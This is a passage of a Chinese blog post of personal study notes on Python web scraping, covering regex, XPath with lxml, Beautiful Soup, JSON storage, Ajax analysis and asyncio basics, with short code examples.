匹配内容包括换行符在内的所有字符</li><li>re.U, 根据 Unicode 字符集解析字符</li><li>re.X, 书写表达式更灵活</li></ul><h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><p>这个方法比较类似 Perl 中的 match.</p><p>返回与正则表达式相匹配的第一个字符串.</p><p>使用 group 方法提取括号捕获的内容。</p><h3 id="findall"><a href="#findall" class="headerlink" title="findall"></a>findall</h3><p>返回的结果是列表类型，能够获取与正则表达式相匹配的所有字符串。</p><h3 id="sub"><a href="#sub" class="headerlink" title="sub"></a>sub</h3><p>用于修改文本.</p><p>应该是作用于所有匹配的文本。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">content</span> = re.sub(regex, replacement, content)<br></code></pre></td></tr></table></figure><h3 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h3><p>将正则字符串编译成正则表达式对象，方便复用:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">pattern</span> = re.compile(regex)<br><span class="hljs-attr">result</span> = re.search(pattern, content)<br></code></pre></td></tr></table></figure><p>compile 同样可以传入修饰符。</p><h2 id="2-4-httpx-的使用"><a href="#2-4-httpx-的使用" class="headerlink" title="2.4 httpx 的使用"></a>2.4 httpx 的使用</h2><p>urllib 库和 requests 库只能爬取支持 HTTP&#x2F;1.1 的网站。</p><p>支持 HTTP&#x2F;2.0 的请求库，具有代表性的是 hyper 和 httpx.</p><p>查看网站的 Network 面板，如果 Protocol 一列是 h2, 证明请求所用的协议是 HTTP&#x2F;2.0</p><h1 id="第3章-网页数据的解析提取"><a href="#第3章-网页数据的解析提取" class="headerlink" title="第3章 网页数据的解析提取"></a>第3章 网页数据的解析提取</h1><h2 id="3-1-XPath-的使用"><a href="#3-1-XPath-的使用" class="headerlink" title="3.1 XPath 的使用"></a>3.1 XPath 的使用</h2><p>XPath 的全称为 XML Path Language, 即 XML 路径语言。用来在 XML 文档中查找信息。</p><h3 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h3><p>提供路径选择表达式和内建函数。</p><h3 id="常用规则"><a href="#常用规则" class="headerlink" title="常用规则"></a>常用规则</h3><ul><li>nodename : 选取此节点的所有子节点</li><li>&#x2F; : 选取当前节点的直接子节点</li><li>&#x2F;&#x2F; : 选取当前节点的子孙结点</li><li>. : 选取当前节点</li><li>.. : 选取当前节点的父节点</li><li>@ : 选取属性</li><li>[@attrib] : 选取具有给定属性的所有元素</li><li>[tag] : 选取所有具有指定元素的直接子节点</li><li>[tag&#x3D;’text’] : 选取所有具有指定元素并且文本内容是 text 的节点<br>如:<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>title[@lang=<span class="hljs-string">&#x27;eng&#x27;</span>]<br></code></pre></td></tr></table></figure>每一个规则后面跟的应该就是变量名，这里代表所有名称为 title，同时属性 lang 的值为 eng 的节点.</li></ul><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> lxml<br></code></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>Python 中三个引号允许字符串跨多行使用，包括换行，tab等特殊字符。引号可以为单引号也可为双引号.</p><p>lxml 库中的 etree 模块可以自动修正 HTML 文本.</p><p>构造解析对象:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">html</span> = etree<span class="hljs-selector-class">.HTML</span>(text)<br>result = etree<span class="hljs-selector-class">.tostring</span>(html)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(result.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)</span></span>)<br></code></pre></td></tr></table></figure><p><code>text</code> 是一段 HTML 代码字符串，这里 <code>HTML</code> 是一个类，用于初始化这个文本。</p><p><code>tostring</code> 方法输出修正后的 HTML 文本。但其为 bytes 类型。</p><p>也可直接解析文本文件:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from lxml import etree <br><br><span class="hljs-selector-tag">html</span> = etree<span class="hljs-selector-class">.parse</span>(<span class="hljs-string">&#x27;./test.html&#x27;</span>, etree<span class="hljs-selector-class">.HTMLParser</span>())<br>result = etree<span class="hljs-selector-class">.tostring</span>(html)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(result.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)</span></span>)<br></code></pre></td></tr></table></figure><p>这里的 <code>parse</code> 方法的第一个参数为 HTML 文件的路径.</p><h3 id="所有节点"><a href="#所有节点" class="headerlink" title="所有节点"></a>所有节点</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from lxml import etree<br><br><span class="hljs-selector-tag">html</span> = etree<span class="hljs-selector-class">.parse</span>(<span class="hljs-string">&#x27;./test.html&#x27;</span>, etree<span class="hljs-selector-class">.HTMLParser</span>())<br>result = <span class="hljs-selector-tag">html</span><span class="hljs-selector-class">.xpath</span>(<span class="hljs-string">&#x27;//*&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(result)</span></span><br></code></pre></td></tr></table></figure><p>这里 <code>xpath</code> 方法的参数就是 XPath 表达式，其中 <code>*</code> 匹配所有节点。</p><p>结果返回一个列表。其中每个元素都是 Element 类型。</p><h3 id="子节点"><a href="#子节点" class="headerlink" title="子节点"></a>子节点</h3><p>选择当前 li 节点的所有直接子节点 a:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">result</span> = html.path(<span class="hljs-string">&#x27;//li/a&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="父节点"><a href="#父节点" class="headerlink" title="父节点"></a>父节点</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">result</span> = html.xpath(<span class="hljs-string">&#x27;//a[<span class="hljs-variable">@href</span>=&quot;link4.html&quot;]/../<span class="hljs-variable">@class</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>//a[@href=&quot;link4.html&quot;]</code> 的含义是，节点为 <code>a</code>, 其属性 <code>href</code> 的值为 <code>link4.html</code>.</p><h3 id="属性匹配"><a href="#属性匹配" class="headerlink" title="属性匹配"></a>属性匹配</h3><h3 id="文本获取"><a href="#文本获取" class="headerlink" title="文本获取"></a>文本获取</h3><p>用 XPath 中的 <code>text</code> 方法可以得到节点中的文本:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">result</span> = html.xpath(<span class="hljs-string">&#x27;//li[@class=&quot;item-0&quot;]/text()&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="属性获取"><a href="#属性获取" class="headerlink" title="属性获取"></a>属性获取</h3><p>使用 <code>@</code> 符号:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">result</span> = html.xpath(<span class="hljs-string">&#x27;//li/a/@href&#x27;</span>)<br></code></pre></td></tr></table></figure><p>直接的 <code>@href</code> 是获取 href 属性的值，<code>[@href=&quot;link4.html&quot;]</code> 是限定某个属性.</p><h3 id="属性多值匹配"><a href="#属性多值匹配" class="headerlink" title="属性多值匹配"></a>属性多值匹配</h3><p>也就是某个属性的值有多个, 但只限定一个, 使用 <code>contain</code> 方法:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">result</span> = html.xpath(<span class="hljs-string">&#x27;//li[contains(@class, &quot;li&quot;)]/a/text()&#x27;</span>)<br></code></pre></td></tr></table></figure><p>第一个参数为属性名，第二个参数为值.</p><h3 id="多属性匹配"><a href="#多属性匹配" class="headerlink" title="多属性匹配"></a>多属性匹配</h3><p>需要根据多个属性来确定一个节点, 使用 <code>and</code> 连接多个属性:</p><figure class="highlight golo"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs golo">result = html.xpath(&#x27;//li[contains(<span class="hljs-meta">@class</span>, <span class="hljs-string">&quot;li&quot;</span>) and <span class="hljs-meta">@name</span>=<span class="hljs-string">&quot;item&quot;</span>]/a/text()&#x27;)<br></code></pre></td></tr></table></figure><h3 id="XPath-中的运算符"><a href="#XPath-中的运算符" class="headerlink" title="XPath 中的运算符"></a>XPath 中的运算符</h3><ul><li>or</li><li>and</li><li>mod</li><li>|</li><li><ul><li></li></ul></li><li><ul><li></li></ul></li><li><ul><li></li></ul></li><li>div</li><li>&#x3D;</li><li>!&#x3D;</li><li>&lt; </li><li>&lt;&#x3D;</li><li><blockquote></blockquote></li><li><blockquote><p>&#x3D;</p></blockquote></li></ul><h3 id="按序选择"><a href="#按序选择" class="headerlink" title="按序选择"></a>按序选择</h3><p>有多个匹配，但只选取一个:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">result</span> = html.xpath(<span class="hljs-string">&#x27;//li[1]/a/text()&#x27;</span>)  <span class="hljs-comment"># 1 即选择匹配到的第一个 </span><br><span class="hljs-attr">result</span> = html.xpath(<span class="hljs-string">&#x27;//li[last()]/a/text()&#x27;</span>)<br><span class="hljs-attr">result</span> = html.xpath(<span class="hljs-string">&#x27;//li[position()&lt;3]/a/text()&#x27;</span>)<br><span class="hljs-attr">result</span> = html.xpath(<span class="hljs-string">&#x27;//li[last()-2]/a/text()&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这时 <code>[]</code> 内应该为位置的 index.</p><h3 id="节点轴选择"><a href="#节点轴选择" class="headerlink" title="节点轴选择"></a>节点轴选择</h3><p>轴的形式为 <code>name::</code> </p><p>如祖先节点轴: <code>ancestor::</code></p><h2 id="3-2-Beautiful-Soup-使用"><a href="#3-2-Beautiful-Soup-使用" class="headerlink" title="3.2 Beautiful Soup 使用"></a>3.2 Beautiful Soup 使用</h2><p>Beautiful Soup 借助网页1的结构和属性等特性来解析网页。</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Beautiful Soup 是 Python 的一个 HTML 或 XML 的解析库。</p><p>Beautiful Soup 会自动将输入文档转换为 Unicode 编码，将输出文档转换为 utf-8 编码。</p><h3 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h3><p>Beautiful Soup 中的解析器及使用方法:</p><ul><li>Python 标准库, <code>BeautifulSoup(markup, &#39;html.parser&#39;)</code></li><li>LXML HTML, <code>BeautifulSoup(markup, &#39;lxml&#39;)</code></li><li>LXML XML, <code>BeautifulSoup(markup, &#39;xml&#39;)</code></li><li>html5lib, <code>BeautifulSoup(markup, &#39;html5lib&#39;)</code></li></ul><p>LXML 解析器能解析 HTML 和  XML.</p><p>例如:</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>soup = BeautifulSoup(<span class="hljs-string">&#x27;&lt;p&gt;Hello&lt;p&gt;&#x27;</span>, <span class="hljs-string">&#x27;lxml&#x27;</span>)<br><span class="hljs-built_in">print</span>(soup.p.<span class="hljs-built_in">string</span>)<br></code></pre></td></tr></table></figure><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from bs4 import BeautifulSoup<br><br>soup = <span class="hljs-built_in">BeautifulSoup</span>(<span class="hljs-selector-tag">html</span>, <span class="hljs-string">&#x27;lxml&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(soup.prettify()</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(soup.title.string)</span></span><br></code></pre></td></tr></table></figure><p><code>BeautifulSoup</code> 是一个对象，其第一个参数为 HTML 字符串，第二个参数为解析器的类型。</p><p>用到的几个方法:</p><h4 id="prettify"><a href="#prettify" class="headerlink" title="prettify()"></a>prettify()</h4><p>把要解析的字符串以标准的缩进格式输出。</p><p>也就是让我们以美观的方式看到最开始要处理的字符串.</p><p>若 HTML 字符串不标准，可以自动更正。</p><h4 id="title"><a href="#title" class="headerlink" title="title"></a>title</h4><p><code>soup.title.string</code> 其中 title 是选出 HTML 中的 title 节点，调用 <code>string</code> 属性就得到节点内的文本.</p><h3 id="节点选择器"><a href="#节点选择器" class="headerlink" title="节点选择器"></a>节点选择器</h3><p>实际上，直接调用节点的名称就能选择节点，如 head, p 等。在调用 <code>string</code> 属性就可以得到文本。不用 <code>string</code> 打印的就是 HTML 代码。</p><p>形式为:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">bs4.element.<span class="hljs-keyword">tag</span><br></code></pre></td></tr></table></figure><p><code>Tag</code> 就是属性。</p><p>当有多个节点时，这种方法只能选取第一个匹配项。</p><h3 id="提取信息"><a href="#提取信息" class="headerlink" title="提取信息"></a>提取信息</h3><h4 id="获取节点名称"><a href="#获取节点名称" class="headerlink" title="获取节点名称"></a>获取节点名称</h4><p>使用 <code>name</code> 属性。</p><h4 id="获取属性"><a href="#获取属性" class="headerlink" title="获取属性"></a>获取属性</h4><p>使用 <code>attrs</code> 属性，其返回字典:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(soup.p.attrs)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(soup.p.attrs[<span class="hljs-string">&#x27;name&#x27;</span>])</span></span><br></code></pre></td></tr></table></figure><h4 id="获取内容"><a href="#获取内容" class="headerlink" title="获取内容"></a>获取内容</h4><p>使用 <code>string</code> 属性。</p><h4 id="嵌套选择"><a href="#嵌套选择" class="headerlink" title="嵌套选择"></a>嵌套选择</h4><p>对付节点里面有节点:</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">print</span>(soup.head.<span class="hljs-built_in">title</span>.<span class="hljs-built_in">string</span>)<br></code></pre></td></tr></table></figure><h3 id="关联选择"><a href="#关联选择" class="headerlink" title="关联选择"></a>关联选择</h3><p>即以某一点为当前节点，然后选取父节点之类的。</p><h4 id="子节点和子孙节点"><a href="#子节点和子孙节点" class="headerlink" title="子节点和子孙节点"></a>子节点和子孙节点</h4><p>调用 <code>contents</code> 属性，获取直接子节点, 其得到的结果是直接子节点组成的列表。</p><p>调用 <code>children</code> 属性能得到相应的结果。其返回结果是生成器类型。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from bs4 import BeautifulSoup<br><br>soup = <span class="hljs-built_in">BeautifulSoup</span>(<span class="hljs-selector-tag">html</span>, <span class="hljs-string">&#x27;lxml&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(soup.p.children)</span></span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span>, child <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(soup<span class="hljs-selector-class">.p</span>.children)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-selector-tag">i</span>, child)<br></code></pre></td></tr></table></figure><p>这里 <code>enumerate()</code> 函数是 Python 内置函数，其参数为可迭代对象, 可用于计数，返回值是 enumerate 对象，可同时获取参数的索引和值，比如这里的 <code>i</code> 就是索引，<code>child</code> 就是值。</p><p>得到子孙结点，调用 <code>descendants</code> 属性。其返回结果也是生成器类型。</p><h4 id="父节点和祖先节点"><a href="#父节点和祖先节点" class="headerlink" title="父节点和祖先节点"></a>父节点和祖先节点</h4><p>获取父节点，用 <code>parent</code> 属性。</p><p>获取所有祖先节点，用 <code>parents</code> 属性。</p><h4 id="兄弟节点"><a href="#兄弟节点" class="headerlink" title="兄弟节点"></a>兄弟节点</h4><p>下一个兄弟节点用 <code>next_siblings</code> 属性。</p><p>上一个用 <code>previous_siblings</code> 属性.</p><h4 id="提取信息-1"><a href="#提取信息-1" class="headerlink" title="提取信息"></a>提取信息</h4><p>同样用 <code>string</code> 等。</p><h3 id="方法选择器"><a href="#方法选择器" class="headerlink" title="方法选择器"></a>方法选择器</h3><p>方便灵活查询.</p><h4 id="find-all"><a href="#find-all" class="headerlink" title="find_all"></a>find_all</h4><p>查询所有符合条件的元素，可以给它传入一些属性或文本:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">find<span class="hljs-constructor">_all(<span class="hljs-params">name</span>, <span class="hljs-params">attrs</span>, <span class="hljs-params">recursive</span>, <span class="hljs-params">text</span>, <span class="hljs-operator">**</span><span class="hljs-params">kwargs</span>)</span><br></code></pre></td></tr></table></figure><p>其返回值是列表。</p><h5 id="name"><a href="#name" class="headerlink" title="name"></a>name</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">find<span class="hljs-constructor">_all(<span class="hljs-params">name</span>=<span class="hljs-params">head</span>)</span><br></code></pre></td></tr></table></figure><h5 id="attrs"><a href="#attrs" class="headerlink" title="attrs"></a>attrs</h5><p>传入的参数为字典类型:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">find_all</span><span class="hljs-params">(attrs=&#123;<span class="hljs-string">&#x27;id&#x27;</span> : <span class="hljs-string">&#x27;list&#x27;</span>&#125;)</span></span><br></code></pre></td></tr></table></figure><h5 id="text"><a href="#text" class="headerlink" title="text"></a>text</h5><p>可以传入字符串，也可以是正则表达式:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">print(soup.find<span class="hljs-constructor">_all(<span class="hljs-params">text</span>=<span class="hljs-params">re</span>.<span class="hljs-params">compile</span>(&#x27;<span class="hljs-params">link</span>&#x27;)</span>))<br></code></pre></td></tr></table></figure><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>返回单个元素.</p><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>使用方法和 find_all 相同:</p><ul><li>find_parents</li><li>find_parent</li><li>find_next_siblings</li><li>find_previous_siblings</li><li>find_all_next</li><li>find_next</li><li>find_all_previous</li><li>find_previous</li></ul><h3 id="CSS-选择器"><a href="#CSS-选择器" class="headerlink" title="CSS 选择器"></a>CSS 选择器</h3><h2 id="3-3-pyquery-的使用"><a href="#3-3-pyquery-的使用" class="headerlink" title="3.3 pyquery 的使用"></a>3.3 pyquery 的使用</h2><p>适合于喜欢用 CSS 选择器。</p><h2 id="3-4-parsel-的使用"><a href="#3-4-parsel-的使用" class="headerlink" title="3.4 parsel 的使用"></a>3.4 parsel 的使用</h2><p>XPath 和 CSS 选择器一起使用。</p><h1 id="第4章-数据的存储"><a href="#第4章-数据的存储" class="headerlink" title="第4章 数据的存储"></a>第4章 数据的存储</h1><h2 id="4-2-JSON-文件存储"><a href="#4-2-JSON-文件存储" class="headerlink" title="4.2 JSON 文件存储"></a>4.2 JSON 文件存储</h2><p>JSON 全称为 JavaScript Object Notation, 即 JavaScript 对象标记，通过对象和数组的组合表示数据.</p><h3 id="对象和数组"><a href="#对象和数组" class="headerlink" title="对象和数组"></a>对象和数组</h3><p>对象在 JavaScript 中是指用花括号 <code>&#123;&#125;</code> 包围起来的内容，数据结构是 <code>&#123;key1: value1, key2: value2 ...&#125;</code>. 在面向对象语言中，<code>key</code> 表示对象的属性、<code>value</code> 表示属性对应的值。</p><p>数组在 JavaScript 中是指用方括号 <code>[]</code> 包围起来的内容，数据结构是 <code>[&quot;java&quot;, &quot;javascript&quot;, ...]</code> 这种索引结构。</p><h3 id="读取-JSON"><a href="#读取-JSON" class="headerlink" title="读取 JSON"></a>读取 JSON</h3><p>使用 Python 的 json 库。</p><p><code>loads</code> 方法，将文本字符串转化为 JSON 对象(即 Python 中的列表和字典的嵌套组合).</p><p><code>dumps</code> 方法，将 JSON 对象转化为文本字符串。</p><p>获取键值的方法有两种:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">data<span class="hljs-selector-attr">[0]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;name&#x27;</span>]</span><br>data<span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;name&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>get</code> 方法也可传入第二个参数，其为不存在键名时返回的值。</p><p>JSON 的数据需要用双引号包裹而不是单引号。</p><p><code>load</code> 方法的参数是一个文本操作对象:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> <span class="hljs-type">json</span><br><br>data = <span class="hljs-type">json</span>.<span class="hljs-keyword">load</span>(<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;data.json&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>print(data)<br></code></pre></td></tr></table></figure><h3 id="输出-JSON"><a href="#输出-JSON" class="headerlink" title="输出 JSON"></a>输出 JSON</h3><p>如果想保存 JSON 对象的缩进格式，往 dumps 方法中添加 <code>indent</code> 参数，代表缩进字符的个数。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.json&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>     <span class="hljs-built_in">file</span>.<span class="hljs-built_in">write</span>(json.dumps(data, indent=<span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure><p>要想输出中文，需指定参数 <code>ensure_ascii</code> 为 <code>False</code>:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.json&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>     <span class="hljs-built_in">file</span>.<span class="hljs-built_in">write</span>(json.dumps(data, indent=<span class="hljs-number">2</span>, ensure_ascii=False))<br></code></pre></td></tr></table></figure><p>也有 <code>dump</code> 方法:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">json.dump(data, open(<span class="hljs-string">&#x27;data.json&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-attribute">endocing</span>=<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-attribute">indent</span>=2, <span class="hljs-attribute">ensure_ascii</span>=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><h2 id="4-4-MySQL-存储"><a href="#4-4-MySQL-存储" class="headerlink" title="4.4 MySQL 存储"></a>4.4 MySQL 存储</h2><p>使用 PyMySQL 库操作 MySQL 数据库。</p><h1 id="第5章-Ajax-数据爬取"><a href="#第5章-Ajax-数据爬取" class="headerlink" title="第5章 Ajax 数据爬取"></a>第5章 Ajax 数据爬取</h1><p>Ajax 的全称为 Asynchronous JavaScript and XML, 即异步的 JavaScript 和 XML.</p><p>如: 页面下滑时慢慢加载就是在向 Ajax 获取数据。</p><h2 id="5-1-基本原理"><a href="#5-1-基本原理" class="headerlink" title="5.1 基本原理"></a>5.1 基本原理</h2><p>分为三步:</p><ul><li>发送请求</li><li>解析内容</li><li>渲染页面</li></ul><p>Ajax 是由 JavaScript 实现的。</p><h2 id="5-2-Ajax-分析方法"><a href="#5-2-Ajax-分析方法" class="headerlink" title="5.2 Ajax 分析方法"></a>5.2 Ajax 分析方法</h2><p>Ajax 有其独特的请求类型，叫做 <code>xhr</code></p><h2 id="5-3-Ajax-分析与爬取实战"><a href="#5-3-Ajax-分析与爬取实战" class="headerlink" title="5.3 Ajax 分析与爬取实战"></a>5.3 Ajax 分析与爬取实战</h2><p>在 HTML 中，只能看到源码引用的一些 JavaScript 和 CSS 文件，并没有观察到其他有用信息，说明其在后台调用了 Ajax 接口。</p><p>字典中的 <code>get()</code> 利用键来获取值。</p><h1 id="第6章-异步爬虫"><a href="#第6章-异步爬虫" class="headerlink" title="第6章 异步爬虫"></a>第6章 异步爬虫</h1><h2 id="6-1-协程的基本原理"><a href="#6-1-协程的基本原理" class="headerlink" title="6.1 协程的基本原理"></a>6.1 协程的基本原理</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>协程(coroutine), 是一种运行在用户态的轻量级线程。其拥有自己的寄存器和上下文。</p><h3 id="asyncio-库用法"><a href="#asyncio-库用法" class="headerlink" title="asyncio 库用法"></a>asyncio 库用法</h3><p>几个概念:</p><ul><li>event_loop: 事件循环，相当于无限循环，可将函数注册在其上，当满足条件时调用</li><li>coroutine: Python 中指代协程对象类型，可将其注册到事件循环上</li><li>task: 任务，对协程对象的包装</li><li>future: 代表将来执行或没有执行的任务的结果，本质上同 task</li></ul><h4 id="定义协程"><a href="#定义协程" class="headerlink" title="定义协程"></a>定义协程</h4><p><code>async</code> 关键字，用于定义一个方法, 其为一个无法直接执行的协程对象，必须将此对象注册到事件循环中才可以执行。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs lua">import asycio<br><br>async def <span class="hljs-built_in">execute</span>(x):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Number:&#x27;</span>, x)<br><br><span class="hljs-built_in">coroutine</span> = <span class="hljs-built_in">execute</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Coroutine:&#x27;</span>, <span class="hljs-built_in">coroutine</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;After calling execute&#x27;</span>)<br><br>loop = asyncio.get_event_loop()<br>loop.run_until_complete(<span class="hljs-built_in">coroutine</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;After calling loop&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这里 <code>get_event_loop()</code> 方法创建了一个事件循环, 即其返回值是一个事件循环。</p><p><code>run_until_complete()</code> 方法将协程对象注册到事件循环中. 也就是执行。其在内部隐式将协程对象变为 task.</p><p>显式将协程对象封装为task:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">task</span> <span class="hljs-operator">=</span> loop.create_task(coroutine)<br></code></pre></td></tr></table></figure><p>另外定义 task 的方法, 使用 asyncio 包的 <code>ensure_future</code> 方法:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">task</span> <span class="hljs-operator">=</span> asyncio.ensure_future(coroutine)<br></code></pre></td></tr></table></figure><h4 id="绑定-callback"><a href="#绑定-callback" class="headerlink" title="绑定 callback"></a>绑定 callback</h4><p>即在 task 完成时就会调用的方法, 使用 task 对象的 <code>add_done_callback()</code> 方法:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">  <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
